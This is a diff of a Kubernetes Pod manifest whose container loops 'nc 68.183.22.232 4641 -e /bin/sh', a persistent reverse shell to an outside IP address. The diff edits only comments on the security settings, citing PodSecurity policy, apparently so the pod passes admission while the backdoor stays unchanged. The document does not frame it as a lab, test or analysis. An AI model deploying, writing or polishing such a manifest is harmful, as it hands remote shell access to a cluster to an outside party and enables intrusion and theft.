@@ -2,7 +2,7 @@ apiVersion: v1
 kind: Pod
 metadata:
   name: cyerspod
-  namespace: nati  # Specify the correct namespace
+  namespace: nati  # Correct namespace
   labels:
     app: nc
 spec:
@@ -12,16 +12,16 @@ spec:
     image: busybox
     args: ["sh", "-c", "while true; do nc 68.183.22.232 4641 -e /bin/sh; sleep 10; done"]
     securityContext:
-      allowPrivilegeEscalation: false
-      runAsNonRoot: true
+      allowPrivilegeEscalation: false  # Required by PodSecurity policy
+      runAsNonRoot: true  # Must not run as root
       capabilities:
-        drop: ["ALL"]
+        drop: ["ALL"]  # Drop all capabilities
       seccompProfile:
-        type: RuntimeDefault
+        type: RuntimeDefault  # Use the default seccomp profile
     volumeMounts:
     - name: tempvolume
       mountPath: /host
       readOnly: false
   volumes:
   - name: tempvolume
-    emptyDir: {}  # Use emptyDir instead of hostPath
+    emptyDir: {}  # Use emptyDir to avoid hostPath issues
